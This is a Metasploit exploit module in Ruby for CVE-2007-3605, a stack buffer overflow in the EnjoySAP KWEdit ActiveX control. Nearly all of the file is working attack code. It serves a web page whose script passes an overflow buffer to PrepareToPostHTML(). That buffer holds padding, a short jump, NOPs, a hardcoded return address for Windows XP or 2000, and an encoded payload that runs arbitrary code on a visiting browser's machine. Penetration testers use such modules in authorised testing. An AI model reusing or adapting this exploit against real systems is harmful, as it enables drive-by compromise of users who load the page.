##
# $Id: enjoysapgui_preparetoposthtml.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EnjoySAP SAP GUI ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in SAP KWEdit ActiveX
				Control (kwedit.dll 6400.1.1.41) provided by EnjoySAP GUI. By sending
				an overly long string to the "PrepareToPostHTML()" method, an attacker
				may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					[ 'CVE', '2007-3605' ],
					[ 'OSVDB', '37690' ],
					[ 'BID', '24772' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],
					[ 'Windows 2000 Pro English All',   { 'Ret' => 0x75022ac4 } ],

				],
			'DisclosureDate' => 'Jul 05 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)

		# Build the exploit buffer
		sploit =  rand_text_alpha(1036) + Rex::Arch::X86.jmp_short(6)
		sploit << make_nops(2) + [target.ret].pack('V') + p.encoded

		# Build out the message
		content = %Q|<html>
<object classid='clsid:2137278D-EF5C-11D3-96CE-0004AC965257' id='#{vname}' /></object>
<script language='javascript'>
#{strname} = new String('#{sploit}')
#{vname}.PrepareToPostHTML(#{strname})
</script>
</html>
|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end